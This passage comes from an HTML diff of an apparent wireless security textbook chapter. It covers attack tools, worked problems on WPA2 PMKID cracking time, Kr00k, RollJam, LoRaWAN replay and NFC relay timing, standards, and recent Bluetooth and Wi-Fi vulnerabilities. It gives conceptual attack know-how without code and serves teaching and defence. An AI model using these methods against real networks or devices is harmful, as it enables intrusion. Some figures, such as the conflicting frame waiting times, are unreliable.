+<td style="text-align: left;">Ettus / NI</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">DC–6 GHz, 100 MHz BW, GbE</td>
+</tr>
+<tr>
+<td style="text-align: left;">Ubertooth One</td>
+<td style="text-align: left;">Great Scott Gadgets</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">Bluetooth 2.4 GHz sniffer / TX</td>
+</tr>
+<tr>
+<td style="text-align: left;">ESP32 Wi-Fi</td>
+<td style="text-align: left;">Espressif</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">Wi-Fi 4 + BT5 SoC, JTAG debug</td>
+</tr>
+<tr>
+<td style="text-align: left;">Pwnagotchi</td>
+<td style="text-align: left;">evilsocket</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">Pi Zero W WPA handshake capturer</td>
+</tr>
+<tr>
+<td style="text-align: left;">WAIDPS (Wireless IDPS)</td>
+<td style="text-align: left;">Various</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">Wireless intrusion detection system</td>
+</tr>
+<tr>
+<td style="text-align: left;">Cisco Meraki MR</td>
+<td style="text-align: left;">Cisco</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">Wi-Fi AP with integrated WIPS</td>
+</tr>
+<tr>
+<td style="text-align: left;">Ruckus Cloudpath</td>
+<td style="text-align: left;">Ruckus (CommScope)</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">Enterprise Wi-Fi security + EAP-TLS</td>
+</tr>
+<tr>
+<td style="text-align: left;">Bastille IoT Security</td>
+<td style="text-align: left;">Bastille Networks</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">Wireless device detection, 60 MHz–6 GHz</td>
+</tr>
+<tr>
+<td style="text-align: left;">CRFS RFeye Node</td>
+<td style="text-align: left;">CRFS</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">9 kHz–18 GHz fixed spectrum sensor</td>
+</tr>
+</tbody>
+</table>
+</div></div>
+
+<h2 id="sec-wireless-solved"><span class="secnum">36.15</span> Solved Problems<a class="headerlink" href="#sec-wireless-solved" title="Permanent link">&para;</a></h2>
+<div class="admonition example box-solvedproblem kind-example">
+<p class="admonition-title">Solved Problem: WPA2 PMKID Cracking Time Estimation</p>
+<p>An attacker captures a WPA2 PMKID from a corporate Wi-Fi network. The network uses the SSID “CorpWifi” (8 characters) and the password is drawn from a dictionary of 10 million common passwords. The attacker uses an NVIDIA RTX 4090 GPU running hashcat at <span class="arithmatex">\(1.8 \times 10^6\)</span> PMKID trials per second (mode -m 22000, PBKDF2-SHA1 rate). (a) Calculate the time to exhaust the full dictionary. (b) If the password is a random 12-character alphanumeric string, calculate the brute-force time.</p>
+</div>
+<p><strong>Solution:</strong> <strong>(a) Dictionary attack time:</strong> Dictionary size: <span class="arithmatex">\(10^7\)</span> passwords. Hashcat rate: <span class="arithmatex">\(1.8 \times 10^6\)</span> PMKID/s. Time: <span class="arithmatex">\(T = 10^7 / (1.8 \times 10^6) = 5.56\)</span> seconds. The 10 million common password dictionary is exhausted in under 6 seconds. With rules (best64.rule: 77 rules): <span class="arithmatex">\(10^7 \times 77 = 7.7 \times 10^8\)</span> candidates. Time with rules: <span class="arithmatex">\(7.7 \times 10^8 / 1.8 \times 10^6 = 428\)</span> seconds <span class="arithmatex">\(\approx 7\)</span> minutes.</p>
+<p><strong>(b) Brute-force time for 12-char alphanumeric:</strong> Character set: 62 characters (a-z + A-Z + 0-9). Keyspace: <span class="arithmatex">\(62^{12} = 3.226 \times 10^{21}\)</span> passwords. At <span class="arithmatex">\(1.8 \times 10^6\)</span> trials/second: <span class="arithmatex">\(T = 3.226 \times 10^{21} / 1.8 \times 10^6 = 1.79 \times 10^{15}\)</span> seconds. <span class="arithmatex">\(= 1.79 \times 10^{15} / (3.15 \times 10^7) \approx 5.7 \times 10^7\)</span> years. <strong>Practically infeasible.</strong> Conclusion: use WPA3-SAE (forward secrecy, no offline PMKID attack), minimum 12-character random password for WPA2.</p>
+<div class="admonition example box-solvedproblem kind-example">
+<p class="admonition-title">Solved Problem: Kr00k CVE-2019-15126 Traffic Leakage Calculation</p>
+<p>A Broadcom BCM4358 chip buffers an average of 3 MSDU (MAC Service Data Units) before the TK is cleared on disassociation. Each MSDU is 1500 bytes (maximum). An attacker triggers Kr00k 10 times per session. (a) How many bytes of plaintext traffic are leaked per session? (b) If the victim is browsing HTTPS, what is the security impact? (c) What is the Wi-Fi frame format field that allows decryption?</p>
+</div>
+<p><strong>Solution:</strong> <strong>(a) Bytes leaked per session:</strong> Per Kr00k trigger: 3 MSDUs <span class="arithmatex">\(\times\)</span> 1500 bytes = 4500 bytes. Per session (10 triggers): <span class="arithmatex">\(4500 \times 10 = 45,000\)</span> bytes = 45 KB.</p>
+<p><strong>(b) HTTPS security impact:</strong> HTTPS traffic is TLS-encrypted at the application layer. Even with Wi-Fi decryption via all-zero TK, the attacker sees only the TLS ciphertext. The TLS session key is negotiated over an encrypted channel (TLS 1.3 with ECDHE); Kr00k cannot recover TLS session keys. <strong>Impact on HTTPS: minimal – content remains protected by TLS.</strong> Impact on unencrypted HTTP or DNS (port 53, UDP): fully exposed. A 45 KB HTTP response (e.g., a web page without HTTPS) would be fully decryptable.</p>
+<p><strong>(c) Decryption field:</strong> IEEE 802.11 CCMP frame header includes the PN (Packet Number, 48-bit nonce) in plaintext: PN0, PN1, Rsvd, KeyID, PN2, PN3, PN4, PN5 (8 bytes). Decryption uses AES-128-CCM with TK=0x00<span class="arithmatex">\(\times\)</span>16, PN from the frame header, and A2 (source MAC) as the nonce components. The PN is broadcast in the frame without encryption, so with TK=0 the attacker can directly compute the keystream and decrypt.</p>
+<div class="admonition example box-solvedproblem kind-example">
+<p class="admonition-title">Solved Problem: RollJam Rolling Code Window Analysis</p>
+<p>A KeeLoq keyless entry system uses a rolling code with a 32-bit code space. The receiver accepts codes within a forward window of <span class="arithmatex">\(W = 256\)</span> codes past the last accepted code. The RollJam attack stores code <span class="arithmatex">\(C_n\)</span> while the victim believes code <span class="arithmatex">\(C_{n-1}\)</span> was rejected (car did not open). (a) Under what condition does the stored code <span class="arithmatex">\(C_n\)</span> become invalid? (b) How many button presses must the victim make before <span class="arithmatex">\(C_n\)</span> is no longer valid? (c) Propose a hardware countermeasure that defeats RollJam without changing the radio protocol.</p>
+</div>
+<p><strong>Solution:</strong> <strong>(a) Invalidity condition:</strong> The receiver accepts a code if it is within the window <span class="arithmatex">\([C_{last+1}, C_{last+W}]\)</span>. After the attacker replays <span class="arithmatex">\(C_n\)</span> (car accepts), the receiver’s last accepted code advances to <span class="arithmatex">\(C_n\)</span>. The stored extra code <span class="arithmatex">\(C_{n+1}\)</span> (if the attacker captured more) is valid if it is within <span class="arithmatex">\([C_{n+1}, C_n + 256]\)</span>. The stored <span class="arithmatex">\(C_n\)</span> becomes invalid if the victim presses the button more than <span class="arithmatex">\(W = 256\)</span> times after the attacker’s replay.</p>
+<p><strong>(b) Button presses required for <span class="arithmatex">\(C_n\)</span> invalidity:</strong> If the attacker replays <span class="arithmatex">\(C_n\)</span>, the window advances to <span class="arithmatex">\([C_{n+1}, C_{n+256}]\)</span>. If the victim presses the button 257 times (generating <span class="arithmatex">\(C_{n+257}\)</span>), the receiver window becomes <span class="arithmatex">\([C_{n+258}, C_{n+513}]\)</span>. The attacker’s stored extra code (if any) would need to be <span class="arithmatex">\(&gt; C_{n+257}\)</span>; the originally stolen <span class="arithmatex">\(C_n\)</span> is already replayed (invalid, already accepted). <strong>Without additional stored codes, 0 more presses needed – the attack is already complete.</strong> The danger is that the attacker has <span class="arithmatex">\(C_{n+1}\)</span> stored (captured second press), which remains valid until the victim presses 256 more times.</p>
+<p><strong>(c) Hardware countermeasure:</strong> <strong>Time-based code validity</strong>: timestamp each rolling code with a signed Unix timestamp from the fob’s RTC (Real-Time Clock, e.g., DS3231 with <span class="arithmatex">\(\pm 2\)</span> ppm accuracy). The car receiver rejects any code with timestamp older than 30 seconds. Since the RollJam attack stores <span class="arithmatex">\(C_n\)</span> for an indefinite period, the 30-second window invalidates the stored code. Hardware required in fob: RTC IC + SHA-256 HMAC engine + 32-byte key storage (EEPROM). This approach is used in modern UHF remote implementations (e.g., Continental rolling code with timestamp).</p>
+<div class="admonition example box-solvedproblem kind-example">
+<p class="admonition-title">Solved Problem: LoRaWAN AppSKey Derivation and Replay Vulnerability</p>
+<p>A LoRaWAN v1.0 device uses ABP (Activation By Personalisation) with a static 32-bit DevAddr and fixed NwkSKey / AppSKey. The device sends a sensor reading every 60 seconds. An attacker captures 10 frames. (a) Why is ABP more vulnerable to replay than OTAA? (b) Calculate how long it takes for FCnt (16-bit, LoRaWAN v1.0) to wrap around. (c) What cryptographic property does FCnt wrap-around violate?</p>
+</div>
+<p><strong>Solution:</strong> <strong>(a) ABP vs. OTAA security:</strong> OTAA generates fresh NwkSKey and AppSKey for each join, using a random DevNonce and JoinNonce to prevent key reuse. If the device is reset, it executes a new join and receives new session keys. ABP uses static, pre-provisioned keys (NwkSKey, AppSKey) that never change. If the NwkSKey/AppSKey are extracted from the device (e.g., via JTAG), all past and future traffic can be decrypted. Additionally, the FCnt is stored in RAM; if the device resets (power cycle), the FCnt may reset to 0, reusing the same (key, nonce) pair – a critical cryptographic failure for AES-128-CTR-based encryption.</p>
+<p><strong>(b) FCnt wrap-around time:</strong> 16-bit FCnt: maximum value 65,535. Frame rate: 1 per 60 seconds. Time to wrap: <span class="arithmatex">\(65,535 \times 60 = 3,932,100\)</span> seconds <span class="arithmatex">\(= 45.5\)</span> days. A device operating continuously wraps the FCnt counter every 45 days.</p>
+<p><strong>(c) Cryptographic property violated:</strong> AES-128-CTR (underlying LoRaWAN MIC computation uses AES-CTR for payload confidentiality): the nonce is constructed from (DevAddr, FCnt, direction, block counter). If FCnt reuses a value with the same key, the AES-CTR keystream repeats: <span class="arithmatex">\(C_1 \oplus C_2 = P_1 \oplus P_2\)</span> (ciphertext XOR reveals plaintext XOR). This violates nonce uniqueness – the fundamental requirement for stream cipher security. An attacker who captures frames before and after the wrap-around can XOR any two frames with the same FCnt to cancel the keystream and obtain <span class="arithmatex">\(P_1 \oplus P_2\)</span>. <strong>Violated property: IND-CPA security (nonce uniqueness for AES-CTR).</strong> LoRaWAN v1.1 mitigates this by using a 32-bit FCnt and requiring OTAA re-join on wrap.</p>
+<div class="admonition example box-solvedproblem kind-example">
+<p class="admonition-title">Solved Problem: NFC Relay Attack Timing Detection</p>
+<p>ISO 14443-3 specifies a Frame Waiting Time (FWT) for card responses. For a standard MIFARE DESFire EV3 card, FWT = 4949 ms (maximum). An NFC relay system (NFCGate) has: ghost-to-leech Internet latency 80 ms, leech-to-card RF latency 1 ms, card-to-leech RF latency 1 ms, leech-to-ghost Internet latency 80 ms. (a) What is the total relay round-trip time? (b) Does the relay fit within the FWT? (c) Propose a relay detection threshold for a payment terminal.</p>
+</div>
+<p><strong>Solution:</strong> <strong>(a) Total relay round-trip time:</strong> Ghost RF to reader: <span class="arithmatex">\(\leq 1\)</span> ms (standard NFC). Ghost to leech (Internet): 80 ms. Leech to card RF: 1 ms. Card response to leech RF: 1 ms. Leech to ghost (Internet): 80 ms. Ghost RF response to reader: <span class="arithmatex">\(\leq 1\)</span> ms. <strong>Total relay RTT: <span class="arithmatex">\(80 + 1 + 1 + 80 + 1 + 1 = 164\)</span> ms.</strong></p>
+<p><strong>(b) Relay within FWT?</strong> ISO 14443-3 FWT = 4949 ms for DESFire EV3. <span class="arithmatex">\(164\)</span> ms <span class="arithmatex">\(\ll 4949\)</span> ms. <strong>Yes, the relay fits comfortably within the maximum allowed FWT.</strong></p>
+<p><strong>(c) Detection threshold proposal:</strong> Genuine DESFire EV3 card response time: typically 1–5 ms (card processing + RF). The relay adds 160 ms overhead (2<span class="arithmatex">\(\times\)</span> Internet latency). Detection threshold: if card response time <span class="arithmatex">\(&gt; 15\)</span> ms, flag as potential relay. This provides: 10<span class="arithmatex">\(\times\)</span> margin above genuine card, flags relay with 80 ms Internet latency (even with a fast 40 ms relay, it exceeds the threshold). Implementation: reader firmware timestamps the APDU send and response receive, computes <span class="arithmatex">\(\Delta t\)</span>; alert if <span class="arithmatex">\(\Delta t &gt; 15\)</span> ms on any command during a payment session. This is implemented in EMV Contactless Level 2 as “Timing Anomaly” detection in post-2022 payment terminal firmware (Mastercard M/Chip Advance 5.0).</p>
+<h2 id="sec-wireless-standards"><span class="secnum">36.16</span> Standards<a class="headerlink" href="#sec-wireless-standards" title="Permanent link">&para;</a></h2>
+<ul>
+<li>
+<p><strong>IEEE 802.11-2020</strong>: Wi-Fi core standard including WPA3-SAE, PMF (Protected Management Frames, 802.11w integrated), OWE, GCMP-256.</p>
+</li>
+<li>
+<p><strong>IEEE 802.11ax-2021</strong> (Wi-Fi 6/6E): OFDMA, MU-MIMO, 6 GHz band, WPA3 mandatory for Wi-Fi 6E certification.</p>
+</li>
+<li>
+<p><strong>Bluetooth Core Specification 5.4</strong> (Bluetooth SIG, 2023): Bluetooth LE, BR/EDR, Secure Connections required for pairing, key negotiation entropy minimum 7 bytes (post-KNOB patch).</p>
+</li>
+<li>
+<p><strong>ISO/IEC 14443</strong>: Proximity Cards (13.56 MHz NFC/RFID); Parts 1–4 cover physical, RF, initialisation, and transmission protocols.</p>
+</li>
+<li>
+<p><strong>ISO/IEC 15693</strong>: Vicinity Cards (13.56 MHz, up to 1 m range).</p>
+</li>
+<li>
+<p><strong>IEEE 802.15.4-2020</strong>: PHY and MAC for low-rate wireless networks; foundation for Zigbee, Thread, 6LoWPAN, WirelessHART.</p>
+</li>
+<li>
+<p><strong>LoRaWAN Specification TS001 v1.1</strong>: LoRa Alliance; end-device classes, OTAA join procedure, 32-bit FCnt, application session key derivation.</p>
+</li>
+<li>
+<p><strong>CCC Digital Key Release 3.0</strong> (Car Connectivity Consortium, 2022): UWB-based proximity with BLE pairing; ISO 18013-5 mDL integration; relay attack resistance via ToF ranging.</p>
+</li>
+<li>
+<p><strong>ETSI EN 303 413</strong>: Satellite Earth Stations and Systems – global navigation satellite systems receivers (anti-spoofing and anti-jamming requirements).</p>
+</li>
+<li>
+<p><strong>FCC Part 15</strong>: US regulations for unlicensed RF devices; defines power limits for 315/433/868/915 MHz ISM bands.</p>
+</li>
+<li>
+<p><strong>NIST SP 800-97</strong>: Establishing Wireless Robust Security Networks, a guide to IEEE 802.11i (WPA2/WPA3) deployment security.</p>
+</li>
+<li>
+<p><strong>NIST SP 800-187</strong>: Guide to LTE Security; applicable to cellular-to-Wi-Fi offload and device security.</p>
+</li>
+<li>
+<p><strong>3GPP TS 33.501</strong>: 5G NR security architecture and procedures; defines 5G AKA, SUPI/SUCI protection against IMSI catchers.</p>
+</li>
+</ul>
+<h2 id="sec-ch36-recent"><span class="secnum">36.17</span> Recent Developments (2024–2026)<a class="headerlink" href="#sec-ch36-recent" title="Permanent link">&para;</a></h2>
+<p>Wireless hardware security evolved significantly from 2023 to 2026, with Wi-Fi 7 and Bluetooth 6.0 introducing new security capabilities alongside new attack surfaces, and foundational Bluetooth protocol vulnerabilities documented by INRIA researchers challenging the assumption of forward secrecy in Bluetooth pairing.</p>
+<h3 id="36171-wi-fi-7-ieee-80211be-2024-security-features-and-mlo-attack-surface"><span class="secnum">36.17.1</span> Wi-Fi 7 (IEEE 802.11be, 2024) — Security Features and MLO Attack Surface<a class="headerlink" href="#36171-wi-fi-7-ieee-80211be-2024-security-features-and-mlo-attack-surface" title="Permanent link">&para;</a></h3>
+<p>IEEE 802.11be (Wi-Fi 7) was finalised in May 2024 with several security-relevant features:</p>
+<ul>
+<li>
+<p><strong>Multi-Link Operation (MLO):</strong> Wi-Fi 7’s defining feature allows a single logical Wi-Fi connection to aggregate multiple physical links simultaneously (e.g., 2.4 GHz + 5 GHz + 6 GHz). From a security perspective, MLO introduces a new attack surface: the Multi-Link Device (MLD) setup requires a common MLD MAC address and shared state across links. An attacker who can manipulate one link in the MLD can potentially affect traffic on all links.</p>
+</li>
+<li>
+<p><strong>Security protocol:</strong> Wi-Fi 7 mandates WPA3-Personal (SAE) or WPA3-Enterprise (802.1X/EAP). WPA2 compatibility mode (with TKIP) is removed from Wi-Fi 7 certification requirements.</p>
+</li>
+<li>
+<p><strong>MLO handshake security:</strong> The MLD setup message (ML Probe Request/Response) is sent before WPA3 authentication completes, leaking the MLD MAC address and link configuration in plaintext. Research at ACM WiSec 2024 demonstrated that MLO probe messages enable fingerprinting of Wi-Fi 7 capable hardware before any association, bypassing MAC address randomisation in some chipset implementations.</p>
+</li>
+<li>
+<p><strong>OFDMA scheduling:</strong> Wi-Fi 7’s 4096-QAM OFDMA sub-carrier scheduling requires real-time resource unit (RU) assignment, increasing the complexity of DoS attacks but also the complexity of implementing time-constant WPA3 SAE commit operations on low-power IoT devices.</p>
+</li>
+</ul>
+<div class="tbl" id="tab-wifi-security-gen">
+<div class="tbl-caption"><strong>Table 36.6.</strong> Wi-Fi Generation Security Feature Comparison</div>
+<div class="tbl-scroll">
+<table>
+<thead>
+<tr>
+<th style="text-align: left;"><strong>Generation</strong></th>
+<th style="text-align: left;"><strong>Standard</strong></th>
+<th style="text-align: left;"><strong>Max Bandwidth</strong></th>
+<th style="text-align: left;"><strong>Security Protocol</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">Wi-Fi 5</td>
+<td style="text-align: left;">802.11ac</td>
+<td style="text-align: left;">3.5 Gbps</td>
+<td style="text-align: left;">WPA2/WPA3 (optional)</td>
+</tr>
+<tr>
+<td style="text-align: left;">Wi-Fi 6</td>
+<td style="text-align: left;">802.11ax</td>
+<td style="text-align: left;">9.6 Gbps</td>
+<td style="text-align: left;">WPA3 recommended, WPA2 allowed</td>
+</tr>
+<tr>
+<td style="text-align: left;">Wi-Fi 6E</td>
+<td style="text-align: left;">802.11ax (6 GHz)</td>
+<td style="text-align: left;">9.6 Gbps</td>
+<td style="text-align: left;">WPA3 mandatory (6 GHz band)</td>
+</tr>
+<tr>
+<td style="text-align: left;">Wi-Fi 7</td>
+<td style="text-align: left;">802.11be</td>
+<td style="text-align: left;">46 Gbps</td>
+<td style="text-align: left;">WPA3 mandatory, MLO security</td>
+</tr>
+</tbody>
+</table>
+</div></div>
+
+<h3 id="36172-bluetooth-60-channel-sounding-precise-ranging-and-security-2024"><span class="secnum">36.17.2</span> Bluetooth 6.0 Channel Sounding — Precise Ranging and Security (2024)<a class="headerlink" href="#36172-bluetooth-60-channel-sounding-precise-ranging-and-security-2024" title="Permanent link">&para;</a></h3>
+<p>Bluetooth 6.0 (Bluetooth SIG, September 2024) introduced Channel Sounding (CS), a distance measurement feature with direct security applications:</p>
+<ul>
+<li>
+<p><strong>Channel Sounding mechanism:</strong> CS uses RTT (Round-Trip Time) and phase-based ranging via OFDM subcarrier phase measurement across multiple BLE channels. Precision: <span class="arithmatex">\(\pm10\)</span> cm at distances up to 50 metres with line-of-sight propagation.</p>
+</li>
+<li>
+<p><strong>Security applications:</strong> BLE proximity unlock (car keys, door locks, laptop presence detection) historically relied on RSSI, which is easily spoofed by relay attack hardware (RollJam-class relays). Channel Sounding provides physical-layer distance verification resistant to relay attacks because the speed-of-light propagation delay cannot be physically reduced – a relay at 10 metres adds at least 33 ns latency, detectable by CS RTT measurement.</p>
+</li>
+<li>
+<p><strong>Relay attack resistance analysis:</strong> Channel Sounding RTT threshold for 1-metre proximity: <span class="arithmatex">\(2 \times 1 / (3 \times 10^8) = 6.7\)</span> ns. A relay attack requires the attacker’s system to process and retransmit the CS challenge packet in less than 6.7 ns – not achievable with any commercial RF hardware (minimum processing latency <span class="arithmatex">\(\sim\)</span>100 ns for FPGA-based implementations).</p>
+</li>
+<li>
+<p><strong>Limitations:</strong> CS is vulnerable to NLOS (non-line-of-sight) multipath errors that can cause underestimation of distance. Indoor environments with reflective surfaces can produce CS distance measurements <span class="arithmatex">\(50\%\)</span> shorter than actual physical distance.</p>
+</li>
+</ul>
+<h3 id="36173-cve-2023-45866-blueducky-bluetooth-hid-injection"><span class="secnum">36.17.3</span> CVE-2023-45866 — BlueDucky Bluetooth HID Injection<a class="headerlink" href="#36173-cve-2023-45866-blueducky-bluetooth-hid-injection" title="Permanent link">&para;</a></h3>
+<p>CVE-2023-45866, disclosed December 2023, affected Android, iOS, Linux, and macOS Bluetooth implementations:</p>
+<ul>
+<li>
+<p><strong>Vulnerability:</strong> A design flaw in Bluetooth unauthenticated pairing allowed an attacker to pair a Bluetooth HID keyboard with a target device without user interaction, when the target device had Bluetooth enabled in discoverable mode. The attack exploited the “Just Works” association model accepting connection requests without any user confirmation prompt.</p>
+</li>
+<li>
+<p><strong>Hardware requirement:</strong> Implemented using a Raspberry Pi 4 or any Linux system with a Bluetooth 5.x adapter. The BlueDucky exploit tool (GitHub) automates pairing and HID injection in under 10 seconds.</p>
+</li>
+<li>
+<p><strong>Impact:</strong> Once paired, the attacker can inject arbitrary keystrokes to execute commands, download malware, or exfiltrate credentials on unlocked devices. The attack works at distances up to 100 metres with a high-gain Bluetooth antenna.</p>
+</li>
+<li>
+<p><strong>Patches:</strong> Google Android 14 QPR1 (December 2023), Apple iOS 17.2, and Linux BlueZ kernel patches addressed the unauthenticated pairing acceptance. Devices not updated to patched firmware remain vulnerable when Bluetooth discoverable mode is active.</p>
+</li>
+</ul>
+<h3 id="36174-bluffs-bluetooth-forward-secrecy-attacks-2023-inria"><span class="secnum">36.17.4</span> BLUFFS — Bluetooth Forward Secrecy Attacks (2023, INRIA)<a class="headerlink" href="#36174-bluffs-bluetooth-forward-secrecy-attacks-2023-inria" title="Permanent link">&para;</a></h3>
+<p>BLUFFS (Bluetooth Forward and Future Secrecy Attacks and Defences), published at ACM CCS 2023 by researchers at INRIA (Daniele Antonioli et al.), identified two new attack classes against Bluetooth Classic session key establishment:</p>
+<ul>
+<li>
+<p><strong>Attack description:</strong> BLUFFS exploits Bluetooth Core Specification session key derivation to force the negotiation of a short (7-byte) or reused session key. The attack targets the “Legacy Secure Connections” key derivation function (KDF) in Bluetooth 2.1–5.3, which does not provide forward secrecy because session keys are derived deterministically from the long-term key (LK) and predictable nonces.</p>
+</li>
+<li>
+<p><strong>BLUFFS-1 (session key reuse):</strong> An attacker positioned as a MITM forces both devices to accept a previously-used session key by replaying old nonces, violating forward secrecy: compromise of the old key decrypts all past sessions.</p>
+</li>
+<li>
+<p><strong>BLUFFS-2 (key entropy reduction):</strong> Forces negotiation of a 7-byte (56-bit) session key (minimum allowed by the Bluetooth 5.3 specification) by manipulating the HCI key size negotiation. With 56-bit entropy and AES-CCM, brute-force recovery is feasible with a GPU cluster in hours.</p>
+</li>
+<li>
+<p><strong>Mitigations:</strong> The Bluetooth SIG assigned CVE-2023-24023 and issued a recommendation to enforce minimum session key length of 16 bytes in Bluetooth Classic. Hardware Bluetooth controllers (Qualcomm WCN6856, MediaTek MT6655) require firmware update to enforce the minimum key length in hardware before the HCI layer negotiation.</p>
+</li>
+</ul>
+<div class="admonition note box-notebox kind-note">
+<p><strong>Note:</strong> BLUFFS exposes that Bluetooth Classic’s legacy secure connection mode fundamentally lacks forward secrecy. Devices processing highly sensitive data should use Bluetooth Low Energy Secure Connections (LESC) with LE SC OOB pairing, which uses Curve25519 ECDH and provides forward secrecy, rather than Bluetooth Classic ACL links.</p>
+</div>
+<h3 id="36175-uwb-security-in-apple-u2u3-airdrop-and-car-key-applications"><span class="secnum">36.17.5</span> UWB Security in Apple U2/U3 — AirDrop and Car Key Applications<a class="headerlink" href="#36175-uwb-security-in-apple-u2u3-airdrop-and-car-key-applications" title="Permanent link">&para;</a></h3>
+<p>Apple’s Ultra Wideband chip evolution from U1 (2019) to U2 (2022) and U3 (2024) added hardware security features for ranging applications:</p>
+<ul>
+<li>
+<p><strong>Apple U3 chip (A17 Pro, iPhone 15 Pro, 2023):</strong> Introduced Precision Finding 3.0 with hardware-attested ranging. The U3 ranging result is signed by an on-chip secure element key (co-located on the A17 Pro die) before being passed to the application processor, preventing software from injecting falsified ranging data to bypass proximity-based access controls.</p>
+</li>
+<li>
+<p><strong>Car Key (Digital Key 3.0, CCC spec):</strong> The Car Key standard uses UWB ranging for passive entry (unlock when owner’s iPhone approaches) authenticated by ECDH P-256 + UWB Channel Impulse Response fingerprinting. The UWB CIR fingerprint is hardware-captured and cannot be replayed because the impulse response of the physical channel changes with centimetre-level position changes.</p>
+</li>
+<li>
+<p><strong>AirDrop secure ranging:</strong> iOS 17 AirDrop uses U2/U3 UWB ranging to confirm that a file transfer recipient is within 30 cm before enabling “everyone” mode AirDrop transfers, mitigating AirDrop spam and MITM interception by ensuring the physically-close intended recipient receives the file.</p>
+</li>
+</ul>
+<h3 id="36176-nfc-relay-attack-evolution-act-android-nfc-relay-20232024"><span class="secnum">36.17.6</span> NFC Relay Attack Evolution — ACT Android NFC Relay (2023–2024)<a class="headerlink" href="#36176-nfc-relay-attack-evolution-act-android-nfc-relay-20232024" title="Permanent link">&para;</a></h3>
+<p>NFC relay attacks advanced with the ACT (Android NFC Relay) framework (2023):</p>
+<ul>
+<li>
+<p><strong>ACT framework:</strong> ACT enables relay attacks between two Android devices using standard Android NFC APIs (no root required), relaying ISO 14443-4 APDU commands over a TCP/IP channel. Total relay latency: <span class="arithmatex">\(\sim\)</span>150 ms on LTE, enabling relay across city distances.</p>
+</li>
+<li>
+<p><strong>Transport payment impact:</strong> EMV contactless payments have a Frame Waiting Time (FWT) of 302 ms maximum (FWT=14, per ISO 14443-3). ACT’s 150 ms round-trip latency falls within the FWT window, making relay attacks against EMV contactless payments technically feasible on commodity hardware.</p>
+</li>
+<li>
+<p><strong>Distance Bounding countermeasure:</strong> ISO 14443-3 does not natively include distance bounding. Visa and Mastercard’s transaction relay countermeasures rely on behavioural analytics (transaction velocity, geo-velocity) rather than hardware distance bounding. True hardware countermeasure: NFC v2.0 with UWB binding (as implemented in Digital Key 3.0) adds physical proximity verification that cannot be relayed.</p>
+</li>
+</ul>
+<h3 id="36177-lorawan-111-security-mitigations-2024"><span class="secnum">36.17.7</span> LoRaWAN 1.1.1 — Security Mitigations (2024)<a class="headerlink" href="#36177-lorawan-111-security-mitigations-2024" title="Permanent link">&para;</a></h3>
+<p>LoRaWAN 1.1.1 (LoRa Alliance, 2024) addressed several security issues from LoRaWAN 1.1:</p>
+<ul>
+<li>
+<p><strong>FCnt anti-rollback:</strong> LoRaWAN 1.1 32-bit FCnt already addressed the 16-bit wrap issue. Version 1.1.1 mandates that gateway-side network servers enforce FCnt monotonicity even across device power cycles, requiring the device to store the last FCnt in non-volatile flash (not RAM) to survive resets.</p>
+</li>
+<li>
+<p><strong>Join server HSM requirements:</strong> LoRaWAN 1.1.1 specifies that the LoRaWAN Join Server storing AppKeys must use a FIPS 140-3 Level 2 HSM for key storage, aligning with GSMA SGP.22 SIM personalisation security.</p>
+</li>
+<li>
+<p><strong>Replay window tightening:</strong> The Network Server maximum uplink FCnt gap tolerance (replay window) is specified as 16,384 frames maximum (down from unlimited in some implementations), limiting the window available to an attacker who stores a captured frame for later replay.</p>
+</li>
+<li>
+<p><strong>Hardware impact:</strong> LoRa module vendors (Semtech SX1262, ST STM32WL) updated reference firmware to store FCnt in EEPROM/OTP with write-verification to detect flash wear attacks that could reset the counter without triggering a Join procedure.</p>
+</li>
+</ul>
+<h2 id="sec-wireless-exercises"><span class="secnum">36.18</span> Exercises<a class="headerlink" href="#sec-wireless-exercises" title="Permanent link">&para;</a></h2>
+<div class="admonition example box-exercises kind-example">
+<p class="admonition-title">Exercises</p>
+<ol>
+<li>
+<p>A Wi-Fi network uses WPA2-CCMP (AES-128-CCM). An attacker captures the full 4-way EAPOL handshake and also a PMKID from frame 1. (a) What is the difference between a handshake-based and PMKID-based offline attack? (b) The network password is “Winter2024!” (10 characters). Estimate the GPU-based cracking time using hashcat on a single RTX 4090 at <span class="arithmatex">\(1.8 \times 10^6\)</span> PMKID/s, assuming a rules-based attack with the rockyou.txt dictionary plus best64 rules.</p>
+</li>
+<li>
+<p>Broadpwn (CVE-2017-0561) achieves remote code execution on the Broadcom BCM43xx FullMAC Wi-Fi firmware without any user interaction. The firmware runs on an ARM Cortex-R4. (a) Explain why the FullMAC architecture (firmware processes 802.11 before the host CPU) is a security liability. (b) What firmware security features (stack canaries, ASLR, NX bit) were absent in BCM43xx? (c) How does the BCM4389 (newer Broadcom chip) address these issues?</p>
+</li>
+<li>
+<p>The KNOB attack (CVE-2019-9506) reduces Bluetooth BR/EDR session entropy to 1 byte. (a) How many bits does a 1-byte Bluetooth session key have? (b) At <span class="arithmatex">\(10^9\)</span> AES-128 operations per second, how long does brute-force take? (c) The Bluetooth Core Spec 5.0 introduced a minimum entropy requirement. What is the minimum now, and how does the LMP entropy negotiation enforce it?</p>
+</li>
+<li>
+<p>A Zigbee smart meter uses AES-128-CCM* for link-layer encryption with the network key distributed via an insecure trust centre join (no pre-installed link key). An attacker uses KillerBee to sniff the network. (a) How does the attacker recover the network key from a join frame? (b) Once the network key is known, what commands can the attacker inject into the smart meter?</p>
+</li>
+<li>
+<p>LoRaWAN OTAA join uses AppKey to derive JoinSKey and AppSKey. The AppKey is a 128-bit root key stored in the device. (a) If an attacker extracts the AppKey via a JTAG physical attack on the LoRa end-device MCU (e.g., STM32L476), can they decrypt past sessions? (b) What “harvest-now-decrypt-later” threat does this create for a 10-year-lifetime smart meter deployment?</p>
+</li>
+<li>
